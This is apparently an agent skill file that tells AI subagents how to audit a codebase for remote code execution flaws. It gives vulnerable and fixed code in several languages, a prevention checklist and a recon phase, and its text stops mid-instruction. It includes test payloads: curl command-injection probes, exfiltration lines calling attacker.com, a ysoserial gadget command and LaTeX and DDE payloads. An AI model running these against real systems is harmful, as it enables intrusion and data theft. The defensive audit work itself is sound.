# Remote Code Execution (RCE) Detection

[ref: #rce-detection]

You are performing a focused security assessment to find Remote Code Execution vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find dangerous execution sinks), **batched verify** (trace whether user-supplied input reaches each sink in parallel batches of 3), and **merge** (consolidate batch results into the final report).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is Remote Code Execution

Remote Code Execution (RCE) occurs when an attacker can cause the application to execute arbitrary OS commands or application-level code that they control. This is typically the highest-severity vulnerability class, often resulting in complete server compromise.

RCE arises from three primary root causes:

1. **OS Command Injection**: User input is embedded unsafely into an OS command string, allowing shell metacharacters to inject additional commands.
2. **Code Injection (eval-like)**: User input is passed to functions that interpret it as executable code (`eval`, `exec`, `Function()`, etc.).
3. **Unsafe Deserialization**: User-supplied serialized data is deserialized using a gadget-prone deserializer, triggering arbitrary code execution via crafted payloads.

### CWE References

Map findings to the following CWE entries in reports and cross-references:

| CWE | Name | Typical RCE Manifestation |
|-----|------|---------------------------|
| [CWE-78](https://cwe.mitre.org/data/definitions/78.html) | OS Command Injection | Untrusted input reaches `system`, `exec`, `subprocess`, `ProcessBuilder`, `Runtime.exec`, `Process.Start`, or shell-equivalent APIs. |
| [CWE-94](https://cwe.mitre.org/data/definitions/94.html) | Improper Control of Generation of Code ('Code Injection') | Untrusted input reaches `eval`, `exec`, `new Function`, `compile`, expression-language parsers, or dynamic code runners. |
| [CWE-95](https://cwe.mitre.org/data/definitions/95.html) | Eval Injection | A specific form of CWE-94 where input is passed to an eval-style evaluator (e.g., JavaScript `eval`, Python `eval`, PHP `eval`). |
| [CWE-502](https://cwe.mitre.org/data/definitions/502.html) | Deserialization of Untrusted Data | Untrusted bytes are fed to deserializers such as Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`, or Ruby `Marshal`. |

When writing findings, include the most specific CWE identifier in the issue description or remediation notes.

### What RCE IS

- Passing user input directly or indirectly into OS command execution functions with shell interpretation enabled
- Using `eval()`, `exec()`, `Function()`, or equivalent constructs with user-controlled strings
- Deserializing user-supplied bytes/strings with inherently unsafe deserializers (pickle, PHP unserialize, Java native serialization, Ruby Marshal, etc.)
- Using `yaml.load()` without a safe loader on user-supplied content
- Dynamic `require()`/`import()` with user-controlled module paths
- PHP file inclusion (`include`/`require`) with user-controlled paths
- Passing attacker-controlled data to expression-language evaluators (Spring SpEL, Struts OGNL, Apache JEXL, etc.)
- Feeding user-controlled filenames, URLs, or conversion options to document/media processors that execute embedded scripts or shell out (ImageMagick, FFmpeg, LaTeX, PDF generators, Office converters)
- Allowing untrusted input to influence build scripts, CI/CD expressions, Lambda layers, or cloud-init user data

### What RCE is Not

Do not flag these as RCE:

- **SSRF**: Making HTTP requests to attacker-controlled URLs — different vulnerability class (no code execution)
- **Path Traversal**: Reading/writing arbitrary files — separate class (unless the read file is then executed/deserialized)
- **SSTI**: Template injection via template engines — a separate though related class; flag as SSTI, not RCE. Pure server-side template injection belongs to `06-ssti.md`. However, when a template engine allows arbitrary code execution (e.g., Jinja2 `{{ config.__class__... }}`, Thymeleaf expression access to `Runtime`, FreeMarker `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`), the finding should be flagged in both `05_rce.md` and `06_ssti.md` with a cross-reference.
- **XSS**: JavaScript execution in a victim's browser — client-side only, not server-side RCE
- **SQL Injection**: Injecting into database queries — different class (even if `xp_cmdshell` can lead to OS commands, flag it as SQLi)
- **Safe subprocess list-form calls**: `subprocess.run(["ls", user_arg])` with a list and no `shell=True` — arguments are passed directly to the OS without shell expansion; not vulnerable to command injection
- **Safe deserialization**: `json.loads()`, `yaml.safe_load()`, `xml.etree.ElementTree.parse()` — these formats have no code execution semantics

### Patterns That Prevent RCE

When you see these patterns, the code is likely **not vulnerable**:

**1. Subprocess list form without shell interpretation**
```python
# Python — list args, no shell=True
subprocess.run(["convert", "-resize", size, input_file, output_file])
subprocess.Popen(["git", "clone", repo_url])

# Node.js — spawn with separate args (no shell)
child_process.spawn("ffmpeg", ["-i", inputFile, outputFile])

# Java — ProcessBuilder with list
new ProcessBuilder("ls", "-la", dir).start()

# Ruby — system() with multiple args (not a single interpolated string)
system("ffmpeg", "-i", "input.mp4", "-f", format, "output")
```

**2. Safe deserialization formats**
```python
# Python — JSON instead of pickle
import json
data = json.loads(user_input)  # no code execution semantics

# Python — safe YAML loader
import yaml
data = yaml.safe_load(user_input)  # restricts to basic types only

# Java — Jackson without enableDefaultTyping, with concrete target type
ObjectMapper mapper = new ObjectMapper();
MyClass obj = mapper.readValue(json, MyClass.class);  # safe
```

**3. Strict allowlist before command construction**
```python
# Python — allowlist for dynamic arguments
ALLOWED_FORMATS = {"png", "jpg", "webp"}
if fmt not in ALLOWED_FORMATS:
    return abort(400)
subprocess.run(["convert", infile, f"output.{fmt}"])

# Node.js — allowlist for dynamic args
const ALLOWED_COMMANDS = ['ls', 'pwd'];
if (!ALLOWED_COMMANDS.includes(cmd)) return res.status(400).end();
spawn(cmd, []);
```

---

## Vulnerable vs. Secure Examples

### OS Command Injection — Python

```python
# VULNERABLE: shell=True with f-string
@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    return result.stdout
# Payload: ?host=127.0.0.1;id  → executes "id"

# VULNERABLE: os.system with string formatting
def convert_image(filename):
    size = request.form.get('size')
    os.system(f"convert {filename} -resize {size} output.jpg")

# SECURE: list-form subprocess, no shell
@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
    return result.stdout
```

### OS Command Injection — Node.js

```javascript
// VULNERABLE: exec with template literal
app.get('/search', (req, res) => {
  const query = req.query.q;
  exec(`grep -r "${query}" /var/log/app/`, (err, stdout) => {
    res.send(stdout);
  });
});
// Payload: ?q=foo" /etc/passwd "

// VULNERABLE: execSync with concatenation
function runScript(userScript) {
  return execSync('node scripts/' + userScript);
}

// SECURE: spawn with separate args
app.get('/search', (req, res) => {
  const query = req.query.q;
  const proc = spawn('grep', ['-r', query, '/var/log/app/']);
  proc.stdout.on('data', (data) => res.write(data));
  proc.on('close', () => res.end());
});
```

### OS Command Injection — PHP

```php
// VULNERABLE: shell_exec with user input
function generateThumbnail($file) {
    $size = $_GET['size'];
    shell_exec("convert {$file} -resize {$size} thumb.jpg");
}

// VULNERABLE: backtick operator
function checkHost() {
    $host = $_POST['host'];
    $result = `ping -c 1 $host`;
    return $result;
}

// SECURE: escapeshellarg (reduces risk — but prefer removing shell entirely)
function generateThumbnail($file) {
    $size = escapeshellarg($_GET['size']);
    $file = escapeshellarg($file);
    shell_exec("convert $file -resize $size thumb.jpg");
}
```

### OS Command Injection — Ruby

```ruby
# VULNERABLE: string interpolation in system()
get '/convert' do
  format = params[:format]
  system("ffmpeg -i input.mp4 -f #{format} output")
end

# VULNERABLE: backtick with user input
def check_dns
  `nslookup #{params[:host]}`
end

# SECURE: system() with separate args (no shell expansion)
get '/convert' do
  format = params[:format]
  ALLOWED = %w[mp4 avi mkv]
  return 400 unless ALLOWED.include?(format)
  system("ffmpeg", "-i", "input.mp4", "-f", format, "output")
end
```

### OS Command Injection — C# / .NET

```csharp
// VULNERABLE: ProcessStartInfo with interpolated arguments
public string PingHost(string host)
{
    var psi = new ProcessStartInfo("cmd.exe", $"/c ping -n 1 {host}")
    {
        UseShellExecute = false,
        RedirectStandardOutput = true
    };
    using var proc = Process.Start(psi);
    return proc.StandardOutput.ReadToEnd();
}
// Payload in host: 127.0.0.1 & whoami  or  127.0.0.1 && powershell -enc ...

// VULNERABLE: Process.Start with a single command string built from input
Process.Start($"convert {userFile} -resize {userSize} out.jpg");

// SECURE: argument array with no shell interpretation + allowlist
public string PingHost(string host)
{
    if (!IPAddress.TryParse(host, out _))
        throw new ArgumentException("Invalid host");
    var psi = new ProcessStartInfo("ping", "-n 1 " + host)
    {
        UseShellExecute = false,
        RedirectStandardOutput = true
    };
    using var proc = Process.Start(psi);
    return proc.StandardOutput.ReadToEnd();
}
```

### OS Command Injection — Go

```go
// VULNERABLE: shell interpretation via sh -c
func pingHost(host string) ([]byte, error) {
    return exec.Command("sh", "-c", "ping -c 1 "+host).Output()
}
// Payload in host: 127.0.0.1;id  or  127.0.0.1$(id)

// VULNERABLE: command name built from user input
func runTool(tool string) ([]byte, error) {
    return exec.Command(tool).Output() // attacker may supply absolute path
}

// SECURE: argument list, no shell, strict validation
func pingHost(host string) ([]byte, error) {
    if net.ParseIP(host) == nil {
        return nil, errors.New("invalid host")
    }
    return exec.Command("ping", "-c", "1", host).Output()
}
```

### Code Injection — Python eval/exec

```python
# VULNERABLE: eval with user input
@app.route('/calculate')
def calculate():
    expr = request.args.get('expr')
    result = eval(expr)  # attacker can run __import__('os').system('id')
    return str(result)

# VULNERABLE: exec with user code
@app.route('/run')
def run_code():
    code = request.json.get('code')
    exec(code)  # full arbitrary code execution
    return "ok"

# SECURE: ast.literal_eval for safe expression parsing (literals only)
from ast import literal_eval
@app.route('/parse')
def parse():
    data = request.args.get('data')
    result = literal_eval(data)  # only parses strings/numbers/lists/dicts/bools
    return str(result)
```

### Code Injection — JavaScript eval / Function

```javascript
// VULNERABLE: eval with user input
app.post('/formula', (req, res) => {
  const formula = req.body.formula;
  const result = eval(formula);  // RCE: process.exit(), require('child_process')...
  res.json({ result });
});

// VULNERABLE: new Function() constructor
function compute(userExpression) {
  const fn = new Function('x', `return ${userExpression}`);
  return fn(42);
}

// VULNERABLE: vm.runInNewContext (sandbox escape via __proto__ pollution)
const vm = require('vm');
app.post('/eval', (req, res) => {
  const result = vm.runInNewContext(req.body.code);
  res.json({ result });
});

// SECURE: use a math expression library (no arbitrary code)
const { evaluate } = require('mathjs');
app.post('/formula', (req, res) => {
  const result = evaluate(req.body.formula);  // sandboxed math expressions only
  res.json({ result });
});
```

### Code Injection — C# / .NET

```csharp
// VULNERABLE: C# script evaluator with user input
using Microsoft.CodeAnalysis.CSharp.Scripting;
public object EvalUserFormula(string formula)
{
    return CSharpScript.EvaluateAsync(formula).Result; // arbitrary C# execution
}
// Payload in formula: System.Diagnostics.Process.Start("cmd.exe","/c whoami").WaitForExit()

// VULNERABLE: DataBinder.Eval with untrusted expression
var result = DataBinder.Eval(context, userExpression);

// SECURE: dedicated math expression library with no code primitives
using NCalc;
public double EvalUserFormula(string formula)
{
    var expr = new Expression(formula);
    expr.Options = ExpressionOptions.NoCache;
    if (!expr.HasErrors())
        return (double)expr.Evaluate();
    throw new ArgumentException("Invalid expression");
}
```

### Unsafe Deserialization — Python pickle

```python
# VULNERABLE: deserializing user-supplied pickle data
@app.route('/load', methods=['POST'])
def load_session():
    data = request.get_data()
    session = pickle.loads(data)  # attacker controls __reduce__ → RCE
    return jsonify(session)

# VULNERABLE: base64-encoded pickle from cookie
@app.route('/profile')
def profile():
    session_cookie = request.cookies.get('session')
    data = base64.b64decode(session_cookie)
    user = pickle.loads(data)  # crafted cookie → arbitrary code at deserialization
    return render_template('profile.html', user=user)

# SECURE: use JSON (no code execution semantics)
@app.route('/profile')
def profile():
    session_cookie = request.cookies.get('session')
    user = json.loads(base64.b64decode(session_cookie))
    return render_template('profile.html', user=user)
```

### Unsafe Deserialization — Java

```java
// VULNERABLE: ObjectInputStream.readObject() on user-supplied stream
@PostMapping("/deserialize")
public ResponseEntity<?> deserialize(@RequestBody byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // gadget chains (Commons Collections, Spring, etc.) → RCE
    return ResponseEntity.ok(obj);
}

// VULNERABLE: Jackson with enableDefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // attacker specifies arbitrary class type in JSON → RCE
MyData data = mapper.readValue(userJson, MyData.class);

// SECURE: Jackson with concrete type, no enableDefaultTyping
ObjectMapper mapper = new ObjectMapper();
MyData data = mapper.readValue(userJson, MyData.class);  // safe with concrete target type
```

### Unsafe Deserialization — PHP

```php
// VULNERABLE: unserialize() with user input
function loadProfile() {
    $data = base64_decode($_COOKIE['profile']);
    $user = unserialize($data);  // PHP object injection → POP chain → RCE
    return $user;
}

// VULNERABLE: unserialize from POST body
$obj = unserialize($_POST['data']);

// SECURE: json_decode instead
function loadProfile() {
    $data = base64_decode($_COOKIE['profile']);
    $user = json_decode($data, true);  // no code execution semantics
    return $user;
}
```

### Unsafe Deserialization — Ruby Marshal

```ruby
# VULNERABLE: Marshal.load with user-supplied data
post '/restore' do
  data = Base64.decode64(params[:state])
  object = Marshal.load(data)  # arbitrary Ruby object graph → RCE via gadgets
  object.process
end

# SECURE: use JSON
post '/restore' do
  data = JSON.parse(Base64.decode64(params[:state]))
  # work with plain data structures only
end
```

### Unsafe Deserialization — Node.js

```javascript
// VULNERABLE: node-serialize (known RCE via IIFE in serialized string)
const serialize = require('node-serialize');
app.post('/restore', (req, res) => {
  const obj = serialize.unserialize(req.body.data);  // IIFE payload → RCE
  res.json(obj);
});

// VULNERABLE: js-yaml v3 yaml.load (executes JS functions in YAML tags)
const yaml = require('js-yaml');
const data = yaml.load(userInput);  // !!js/function payload → RCE

// SECURE: yaml.safeLoad (v3) or FAILSAFE_SCHEMA (v4)
const data = yaml.safeLoad(userInput);  // only loads plain data types
```

### Unsafe Deserialization — C# / .NET

```csharp
// VULNERABLE: BinaryFormatter on untrusted data
public object LoadSession(byte[] data)
{
    var formatter = new BinaryFormatter();
    using var ms = new MemoryStream(data);
    return formatter.Deserialize(ms);  // gadget chain → RCE
}

// VULNERABLE: Json.NET with TypeNameHandling enabled
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // attacker controls type in JSON → RCE
};
var obj = JsonConvert.DeserializeObject<UserData>(json, settings);

// VULNERABLE: LosFormatter deserialization
var los = new LosFormatter();
var obj = los.Deserialize(userInput);

// SECURE: JSON with concrete type and no type-name handling
var obj = JsonConvert.DeserializeObject<UserData>(json);  // default TypeNameHandling.None
```

### Unsafe Deserialization — Go

```go
// VULNERABLE: gob decoding of attacker-controlled data
func restoreState(data []byte) (State, error) {
    var s State
    dec := gob.NewDecoder(bytes.NewReader(data))
    err := dec.Decode(&s)  // gob can instantiate registered types; risky if untrusted
    return s, err
}

// VULNERABLE: json.Unmarshal into empty interface with custom Unmarshalers
func loadConfig(data []byte) (interface{}, error) {
    var v interface{}
    return v, json.Unmarshal(data, &v) // lower risk than gob, but risky with custom types
}

// SECURE: unmarshal into concrete struct
func loadConfig(data []byte) (*Config, error) {
    var cfg Config
    if err := json.Unmarshal(data, &cfg); err != nil {
        return nil, err
    }
    return &cfg, nil
}
```

### Unsafe YAML — Python

```python
# VULNERABLE: yaml.load without Loader
import yaml
data = yaml.load(user_input)  # !!python/object/apply: payload → RCE

# SECURE: yaml.safe_load
data = yaml.safe_load(user_input)  # only loads basic data types
```

### Expression Language Injection — Java

Expression Language (EL) injection is a code-injection sub-class common in Java web frameworks. Attackers supply EL expressions that the server evaluates with full application context.

```java
// VULNERABLE: Spring SpEL with user-controlled expression
@GetMapping("/evaluate")
public String evaluate(@RequestParam String expr) {
    SpelExpressionParser parser = new SpelExpressionParser();
    StandardEvaluationContext ctx = new StandardEvaluationContext();
    return parser.parseExpression(expr).getValue(ctx, String.class);
}
// Payload: ${T(java.lang.Runtime).getRuntime().exec('id')}

// VULNERABLE: Apache JEXL evaluating user expression
@GetMapping("/jexl")
public Object jexl(@RequestParam String expr) {
    JexlEngine jexl = new JexlBuilder().create();
    JexlExpression e = jexl.createExpression(expr);
    return e.evaluate(new MapContext());
}
// Payload: new("java.lang.Runtime").getRuntime().exec("id")

// VULNERABLE: Struts OGNL via parameter name or value
// http://target/app.action?name=(%23cmd=%27id%27)(... OGNL chain ...)

// SECURE: SimpleEvaluationContext restricting SpEL capabilities
@GetMapping("/evaluate")
public String evaluate(@RequestParam String expr) {
    SpelExpressionParser parser = new SpelExpressionParser();
    EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    return parser.parseExpression(expr).getValue(ctx, String.class);
}
```

### Expression Language Injection — .NET

```csharp
// VULNERABLE: Evaluating user-controlled expression via Jint or similar engine
using Jint;
public object Eval(string userExpr)
{
    return new Engine().Execute(userExpr).GetCompletionValue(); // arbitrary JS execution
}

// SECURE: use a whitelist-based expression parser or a dedicated rules engine
// (e.g., NCalc with no external function access, or Microsoft Rules Engine)
```

---

## Specialized RCE Vectors

Beyond the common sink categories, scan for the following specialized vectors and mention them in findings when applicable.

### 1. Shell Metacharacter Chaining

When user input reaches a shell, the following characters and constructs can inject additional commands:

| Metacharacter / Construct | Effect |
|---------------------------|--------|
| `;` | Command separator: `ping -c 1 127.0.0.1;id` |
| `&&` | Conditional AND: `ping -c 1 127.0.0.1&&id` |
| `\|\|` | Conditional OR: `invalid\|\|id` |
| `\|` | Pipe output: `127.0.0.1\|id` |
| `$()` | Command substitution: `$(id)` |
| `` `...` `` | Command substitution: `` `id` `` |
| `&` | Background command on Windows/cmd: `127.0.0.1&whoami` |
| `\n`, `\r\n` | Newline injection terminates the current command and starts a new one |
| `#` | Comment injection truncating the rest of the command (in shell contexts) |
| `\`, `"` | Quote escaping to break out of quoted strings |

Test payloads must be URL-encoded as needed. Always try the raw character first, then encoded forms (`%3B` for `;`, `%26` for `&`, `%7C` for `|`, `%0A` for newline).

### 2. Polyglot Payloads

A polyglot payload is valid as multiple formats or contexts, allowing it to bypass content-type or format validation before reaching an execution sink. Examples:

- A file that is simultaneously valid as an image and as a PHP/JSP/ASP script (e.g., GIF + PHP code).
- A PDF that is also a valid PostScript program executed by the converter.
- An Office document with embedded macros or DDE fields.
- A LaTeX file containing `\immediate\write18{...}` for shell escape.
- An SVG containing `<script>` executed when rendered by a processor.

When a processor validates file type by extension or magic bytes but then executes content based on a different parser, polyglot payloads can bridge the gap.

### 3. Processor-Related RCE

Document, media, and PDF processors often expose powerful features that become RCE sinks when fed user-controlled input:

| Processor | Dangerous Feature / Sink | Example Payload |
|-----------|--------------------------|-----------------|
| ImageMagick | MVG / MSL interpreters, `@filename`, `ephemeral:`, `vid:`, delegate policy | `push graphic-context viewbox 0 0 100 100 image copy 200,200 0,0 "ephemeral:/etc/passwd" pop graphic-context` |
| FFmpeg | `eval` expressions, `drawtext` with `textfile`, custom protocol handlers, `-f lavfi` | Filename: `https://attacker.com/evil.m3u` or embedded HLS playlist with `exec:` |
| LaTeX | `\write18` shell escape, `\input{\\\|...}`, `\immediate\write18{id}` | Document containing `\immediate\write18{curl attacker.com}` |
| PDF generators | JavaScript in PDF, XFA forms, embedded files, custom fonts | PDF with `app.launchURL("file:///...", true)` |
| Office converters | Macros, DDE fields, OLE objects, external links | DOCX with macro or DDE `DDEAUTO c:\\windows\\system32\\cmd.exe "/k ..."` |

Flag any code path where a user-supplied filename, URL, file content, or conversion option is passed to these processors **without** sandboxing, policy restrictions, or disabling dangerous features.

### 4. Serverless / CI Environment Injection

In serverless and CI/CD contexts, RCE can arise from attacker-controlled data reaching execution primitives inside the deployment or runtime environment:

- **Build scripts**: Untrusted branch names, PR titles, commit messages, or file contents interpolated into shell commands in CI pipelines (e.g., `run: ./build.sh ${{ github.event.pull_request.title }}`).
- **GitHub Actions / GitLab CI expressions**: `${{ }}` expressions evaluated against attacker-influenced contexts; use `env` indirection and avoid `${{ github.event.* }}` in `run:` scripts.
- **Lambda layers / container images**: Malicious dependencies or layers pulled at build time.
- **cloud-init user data**: User-controlled cloud-init scripts passed to cloud VM initialization.
- **Serverless function event data**: Query params, path params, or body fields passed to `eval`, `exec`, `os.system`, or deserialization inside the handler.
- **Terraform / Helm / Kustomize templating**: User input reaching template expressions that render into manifests or shell snippets.

When auditing these environments, trace CI variables, event payloads, and infrastructure-as-code templates as potential user-controlled sources.

---

## Dynamic Test Payloads and PoC curl Examples

Use the payloads below to confirm suspected RCE sinks during Phase 2. Select payloads that match the sink type and platform.

### OS Command Injection

```bash
# Classic command separators
curl "https://app.example.com/ping?host=127.0.0.1;id"
curl "https://app.example.com/ping?host=127.0.0.1%3Bid"

# Pipe and conditional chaining
curl "https://app.example.com/ping?host=127.0.0.1|id"
curl "https://app.example.com/ping?host=127.0.0.1%7Cid"
curl "https://app.example.com/ping?host=127.0.0.1%26%26id"

# Command substitution
curl "https://app.example.com/ping?host=%24%28id%29"   # $(id)
curl "https://app.example.com/ping?host=%60id%60"       # `id`

# Newline injection
curl "https://app.example.com/ping?host=127.0.0.1%0aid"

# Time-based / out-of-band confirmation
curl "https://app.example.com/ping?host=127.0.0.1%3B%20sleep%205"
curl "https://app.example.com/ping?host=127.0.0.1%3B%20nslookup%20%24%28whoami%29.attacker.com"

# Windows cmd
curl "https://app.example.com/ping?host=127.0.0.1%26whoami"
curl "https://app.example.com/ping?host=127.0.0.1%7Cwhoami"
```

### Expression Language Injection

```bash
# Spring SpEL
curl "https://app.example.com/eval?expr=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D"
curl "https://app.example.com/eval?expr=%24%7B1%2B1%7D"  # simpler probe

# Apache JEXL / Unified EL
curl "https://app.example.com/eval?expr=%24%7B%22%22.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22id%22%29%7D"

# Struts OGNL (parameter name or value)
curl "https://app.example.com/action?name=%28%23cmd%3D%27id%27%29%28%23iswin%3D%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29"
```

### Processor-Related RCE

```bash
# ImageMagick MVG probe
curl -F "file=@image.mvg" "https://app.example.com/convert"

# LaTeX shell escape probe
curl -F "file=@doc.tex" "https://app.example.com/render"
# doc.tex contains: \immediate\write18{cat /etc/passwd > /tmp/pwn.txt}\input{/tmp/pwn.txt}

# Office / PDF macro probe
curl -F "file=@macro.docm" "https://app.example.com/preview"
```

### Unsafe Deserialization

For deserialization sinks, craft a gadget payload appropriate to the stack:

```bash
# Java: generate with ysoserial
java -jar ysoserial-all.jar CommonsCollections1 'curl attacker.com/$(whoami)' | base64
# Then send the bytes in the HTTP body or cookie.

# Python pickle
python3 -c "import pickle,base64,os; print(base64.b64encode(pickle.dumps({'__reduce__': ... })).decode())"
# Or use pickletools to craft __reduce__ to os.system('id').

# PHP unserialize
# Craft a POP chain; send as POST body or cookie value.

# .NET BinaryFormatter / LosFormatter
# Use gadgets such as TextFormattingRunProperties or RolePrincipal; encode for the transport.
```

### Serverless / CI Injection

```yaml
# Example unsafe GitHub Actions step
curl -X POST https://api.github.com/repos/org/repo/dispatches \
  -H "Authorization: token $TOKEN" \
  -d '{"event_type":"evil\`; id > /tmp/pwn"}'

# If a workflow interpolates event_type into run:, the backtick command executes.
```

---

## Prevention Checklist

Apply the following controls to eliminate or reduce RCE risk. Map them to OWASP API8:2023 (Security Misconfiguration) and API10:2023 (Unsafe Consumption of APIs) as noted.

- **Eliminate eval-like constructs** (`eval`, `exec`, `Function`, `compile`, SpEL `StandardEvaluationContext`, OGNL, JEXL, C# script evaluators) on untrusted input. Use safe parsers, allowlisted math libraries, or strongly typed data binding instead. *(API10)*
- **Use subprocess list form without shell interpretation**. Never pass a string built from external input to `subprocess.run(..., shell=True)`, `os.system`, `exec`, `child_process.exec`, `Runtime.exec(string)`, `Process.Start` with a single command string, or `sh -c`. *(API10)*
- **Apply strict allowlists** for command names, arguments, file extensions, and format identifiers before passing them to any execution sink. *(API8 / API10)*
- **Disable dangerous defaults** in serializers and processors:
  - Turn off `enableDefaultTyping` / `activateDefaultTyping` in Jackson; use concrete target types. *(API8)*
  - Use JSON, `yaml.safe_load`, or `ast.literal_eval` instead of pickle, PHP `unserialize`, Java native serialization, Ruby `Marshal`, .NET `BinaryFormatter`, or `LosFormatter`. *(API8)*
  - Disable ImageMagick delegates, FFmpeg custom protocols, LaTeX `\write18`, and PDF JavaScript when processing user content. *(API8)*
- **Validate and sandbox processor inputs**. Run media/document converters in isolated, least-privilege containers with network egress disabled. Keep processors updated. *(API8 / API10)*
- **Never deserialize untrusted data** from HTTP bodies, cookies, file uploads, WebSocket frames, queue messages, or third-party API responses with unsafe deserializers. *(API10)*
- **Restrict dynamic imports / requires** to a fixed allowlist of module names; avoid user-controlled module paths. *(API10)*
- **Sanitize CI/CD inputs** and avoid interpolating event payloads (`github.event.*`, `env` from untrusted sources) directly into shell scripts. Use intermediate environment variables and hardened runner images. *(API8 / API10)*
- **Run with least privilege**. Avoid root or service accounts with broad permissions; use dedicated service accounts with minimal filesystem and network access. *(API8)*
- **Keep dependency inventories** and remove unnecessary serialization libraries, command utilities, and language features from production images. *(API8)*

---

## Subagent Constraint Reminder

Subagents performing this RCE assessment MUST:

- **Read only** the project source code and configuration files.
- **Write only** to the report files under `{{ REPORTS_ROOT }}/` (`05_recon.md`, `05_batch_*.md`, `05_rce.md`).
- **Never modify, patch, delete, or commit any project source file**, test file, CI configuration, or infrastructure definition.
- If a proof-of-concept requires generating a test payload, write it to a temporary file under `/tmp/` or describe it in the report; do not leave it inside the project repository.

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Find Dangerous Execution Sinks

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where OS commands are executed, code is dynamically evaluated, expression languages are interpreted, processor commands are built, or data is deserialized using an unsafe deserializer. Flag ANY dynamic variable passed to these sinks, regardless of where it originates. Write results to `{{ REPORTS_ROOT }}/05_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, language, frameworks, and any serialization patterns in use.
>
> ---
>
> **Category 1 — OS Command Execution Sinks**
>
> Look for functions that execute OS commands where the command string or arguments may be dynamically constructed. Flag when any non-constant variable appears in a dangerous position:
>
> **Python:**
> - `os.system(var)` — always flag if any variable
> - `os.popen(var)` — always flag if any variable
> - `subprocess.run(var, shell=True)`, `subprocess.call(var, shell=True)`, `subprocess.Popen(var, shell=True)`, `subprocess.check_output(var, shell=True)` — flag if `shell=True` AND a variable appears in the command string, OR if the command is a string (not a list) with any variable
> - `subprocess.run(f"cmd {var}")` without `shell=True` — flag: passing a string (not list) to subprocess can still be unsafe
> - `commands.getoutput(var)`, `commands.getstatusoutput(var)` — always flag
>
> **Node.js / JavaScript:**
> - `child_process.exec(var)`, `child_process.execSync(var)` — flag if any variable in command string
> - `child_process.execFile(var, ...)` — flag if command or args contain variables
> - `child_process.spawn(var, ...)` or `spawn(cmd, args)` with `shell: true` and variable in command — flag
> - `shelljs.exec(var)`, `execa(var)` — flag if variable in command
>
> **PHP:**
> - `exec(var)`, `system(var)`, `passthru(var)`, `shell_exec(var)`, `popen(var, ...)`, `proc_open(var, ...)` — flag if any variable in command string
> - Backtick operator: `` `...{$var}...` `` or `` `$var` `` — always flag
>
> **Ruby:**
> - `system(var)`, `exec(var)`, `spawn(var)`, `IO.popen(var)`, `Open3.popen3(var)` — flag if string form with interpolated variable
> - Backtick operator: `` `...#{var}...` `` — always flag
> - `%x{...#{var}...}` — always flag
>
> **Java:**
> - `Runtime.getRuntime().exec(var)` — flag if string argument contains variable concatenation
> - `new ProcessBuilder(var)` or `ProcessBuilder` constructed from variable-containing list — flag
>
> **Go:**
> - `exec.Command(var, ...)` — flag if command name or arguments are dynamically built from variables (especially from string splits of external input)
> - `exec.Command("sh", "-c", var)` or similar shell wrappers — flag
>
> **C# / .NET:**
> - `Process.Start(var)` — flag if FileName or Arguments are variable
> - `ProcessStartInfo { FileName = var, Arguments = var }` — flag
>
> **Processors / Shell Outs:**
> - ImageMagick `convert`, `magick` with user-controlled filenames, MVG/MSL inputs, or policy options
> - FFmpeg with user-controlled inputs, playlists, `drawtext`, `eval` expressions, or protocol handlers
> - LaTeX / pdflatex / xelatex with user-controlled `.tex` source or shell-escape flags
> - PDF generators (e.g., wkhtmltopdf, Headless Chrome) with user-controlled HTML/JS or URLs
> - Office converters (LibreOffice, Aspose, etc.) with user-controlled documents
>
> ---
>
> **Category 2 — Code Evaluation Sinks**
>
> Look for functions that interpret strings as executable code or expression language:
>
> **Python:**
> - `eval(var)` — flag if argument is a variable
> - `exec(var)` — flag if argument is a variable
> - `compile(var, ...)` followed by `exec()` — flag
> - `importlib.import_module(var)`, `__import__(var)` — flag if module name is a variable
>
> **JavaScript / Node.js:**
> - `eval(var)` — flag if argument is a variable
> - `new Function(var)`, `new Function('x', var)` — flag if body is a variable
> - `setTimeout(var, delay)`, `setInterval(var, delay)` — flag if first arg is a string variable
> - `vm.runInNewContext(var)`, `vm.runInContext(var)`, `vm.runInThisContext(var)` — flag if variable
> - `require(var)` — flag if module path is a variable (dynamic require with external input → path traversal + potential code execution)
>
> **PHP:**
> - `eval(var)` — always flag if variable in argument
> - `preg_replace(pattern, replacement, subject)` with `/e` modifier in pattern — always flag
> - `assert(var)` with string argument — flag if variable
> - `create_function('', var)` — flag if body is variable
> - `call_user_func(var)`, `call_user_func_array(var, ...)` — flag if function name is a variable
>
> **Ruby:**
> - `eval(var)`, `instance_eval(var)`, `class_eval(var)`, `module_eval(var)` — flag if variable
> - `binding.eval(var)` — flag if variable
>
> **Java:**
> - `SpelExpressionParser.parseExpression(var)` with `StandardEvaluationContext` — flag if expression is variable
> - Struts OGNL evaluation of user-controlled parameter names/values — flag
> - Apache JEXL `createExpression(var)` / `evaluate(var)` — flag if expression is variable
> - Spring `@Value` or Thymeleaf `${...}` / `*{...}` containing user-controlled fragments — flag
>
> **C# / .NET:**
> - `CSharpScript.EvaluateAsync(var)` or Roslyn script execution with user input — flag
> - `DataBinder.Eval(context, var)` with user-controlled expression — flag
